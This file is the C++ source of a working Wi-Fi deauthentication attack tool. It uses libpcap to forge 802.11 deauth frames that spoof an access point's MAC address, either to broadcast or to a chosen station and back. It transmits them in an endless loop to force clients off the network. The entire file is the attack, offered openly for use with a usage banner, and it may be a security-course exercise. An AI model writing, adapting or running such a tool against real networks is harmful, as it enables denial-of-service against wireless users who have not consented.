#include "header.h"

//#pragma pack(push, 1)
//struct DeauthPacket {
//    radiotap_header radio;
//    deauth_header dea;
//    wireless_header wir;
//};
//#pragma pack(pop)

void usage(){
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample 1 : deauth-attack wlan0 00:11:22:33:44:55 \n");
    printf("sample 2 : deauth-attack wlan0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char* argv[])
{
    if (argc < 3 || argc > 4) {
        usage();
        return -1;
    }

    int cmp = 0;

    if(argc == 3 && argc > 2){
        cmp = 1;
    }
    else if(argc == 4 && argc > 2){
        cmp = 2;
    }


    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    DeauthPacket packet_1; // ap -> brodcast or station
    DeauthPacket packet_2; // station -> ap

    packet_1.radio.it_version = version;
    packet_1.radio.it_pad = padding;
    packet_1.radio.it_len = radio_len;
    packet_1.radio.it_present = flags;
    packet_1.dea.type = Type;
    packet_1.dea.dur = padding;
    packet_1.dea.num = number;
    packet_1.wir.code = reason_code;

    if(cmp == 1){
        packet_1.dea.d_addr = Mac("FF:FF:FF:FF:FF:FF");
        packet_1.dea.s_addr = Mac(argv[2]);
        packet_1.dea.bssid = Mac(argv[2]);
    }
    else if(cmp == 2){
        packet_1.dea.d_addr = Mac(argv[3]);
        packet_1.dea.s_addr = Mac(argv[2]);
        packet_1.dea.bssid = Mac(argv[2]);
        packet_2.radio.it_version = version;
        packet_2.radio.it_pad = padding;
        packet_2.radio.it_len = radio_len;
        packet_2.radio.it_present = flags;
        packet_2.dea.type = Type;
        packet_2.dea.dur = padding;
        packet_2.dea.d_addr = Mac(argv[2]);
        packet_2.dea.s_addr = Mac(argv[3]);
        packet_2.dea.bssid = Mac(argv[3]);
        packet_2.dea.num = number;
        packet_2.wir.code = reason_code;
    }


    printf("start send packet\n");


    while(true) {
        if(cmp == 1){
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_1), sizeof(DeauthPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
        else if(cmp == 2){
            int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_1), sizeof(DeauthPacket));
            int res3 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_2), sizeof(DeauthPacket));
            if (res2 != 0 || res3 != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
            }
        }


    }
    printf("\n\n");

    pcap_close(handle);
}

